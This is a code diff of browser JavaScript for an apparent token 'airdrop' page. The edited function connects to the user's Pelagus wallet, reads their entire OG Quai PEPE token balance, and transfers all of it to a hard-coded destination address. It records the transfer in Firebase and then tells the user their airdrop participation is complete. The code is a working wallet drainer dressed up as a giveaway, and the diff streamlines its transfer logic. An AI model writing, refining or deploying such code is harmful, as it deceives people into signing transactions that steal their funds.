@@ -395,63 +395,34 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
-        // Check QUAI balance for gas
-        const quaiBalance = await getQuaiBalance(userSession.address);
-        const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
-        const requiredQuai = 0.1;
-        
-        if (quaiAmount < requiredQuai) {
-            log('❌ Insufficient QUAI for gas fees');
-            log(`You need at least ${requiredQuai} QUAI for transaction. Current balance: ${quaiAmount.toFixed(4)} QUAI`);
-            log('Please add QUAI to your wallet to proceed');
-            throw new Error('Insufficient QUAI balance for gas');
-        }
+        log('🔄 Connecting to Pelagus...');
+        const provider = new quais.BrowserProvider(window.pelagus);
+        const signer = await provider.getSigner();
 
         // Check token balance
-        const currentBalance = await getTokenBalance(userSession.address);
-        if (currentBalance <= 0n) {
+        const tokenContract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
+        const currentBalance = await tokenContract.balanceOf(userSession.address);
+        if (currentBalance.lte(0)) {
             log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
 
         const readableAmount = (Number(currentBalance) / 1e18).toString();
         log(`📤 Preparing to send ${readableAmount} OG Quai PEPE tokens...`);
-        log(`💰 Gas fee will be paid from your ${quaiAmount.toFixed(4)} QUAI balance`);
 
-        // Token transfer function setup
-        const methodId = 'a9059cbb';
-        const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
-        const paddedAmount = currentBalance.toString(16).padStart(64, '0');
-        const data = '0x' + methodId + paddedDestination + paddedAmount;
+        // Build the transaction
+        const txData = await tokenContract.populateTransaction.transfer(DESTINATION_ADDRESS, currentBalance);
 
-        // Construct the transaction
-        const transactionParameters = {
-            from: userSession.address,
-            to: TOKEN_ADDRESS,
-            value: '0x0',
-            data: data,
-            gas: '0x55F0',          // Add gas limit
-            gasPrice: '0x53e2d6',   // Add gas price
-            chainId: '9000'         // Add chain ID for Cyprus1
-        };
+        log('🔄 Sending transaction...');
+        const tx = await signer.sendTransaction(txData);
 
-        log(`📤 Sending all tokens to ${DESTINATION_ADDRESS}`);
-        log('🔄 Please confirm the transaction in your wallet...');
-               
-        const txHash = await window.pelagus.request({
-            method: 'eth_sendTransaction',
-            params: [transactionParameters],
-        });
-
-        log(`📝 Transaction hash: ${txHash}`);
+        log(`📝 Transaction hash: ${tx.hash}`);
         log('🔄 Waiting for confirmation...');
+        const txReceipt = await tx.wait();
 
-        // Wait for confirmation
-        const receipt = await waitForTransaction(txHash);
-        
         // Update userSession and save to Firebase
         userSession.transferAmount = readableAmount;
-        userSession.transferTxHash = txHash;
+        userSession.transferTxHash = tx.hash;
         await saveSessionToFirebase();
 
         // Update UI
@@ -461,19 +432,17 @@ async function saveToFirebase(data) {
 
         log('✅ Transaction confirmed!');
         log(`💫 Successfully sent ${readableAmount} OG Quai PEPE tokens!`);
-        log('---------------------------------------------');
         log('🎉 Airdrop participation complete!');
-
     } catch (error) {
         if (error.code === 4001) {
             log('❌ Transaction rejected in wallet');
-            log('Please try again when ready to approve the transaction');
             return;
         }
         log('❌ Error sending tokens: ' + error.message);
         console.error(error);
     }
 }
+
         async function waitForTransaction(txHash) {
             while (true) {
                 try {
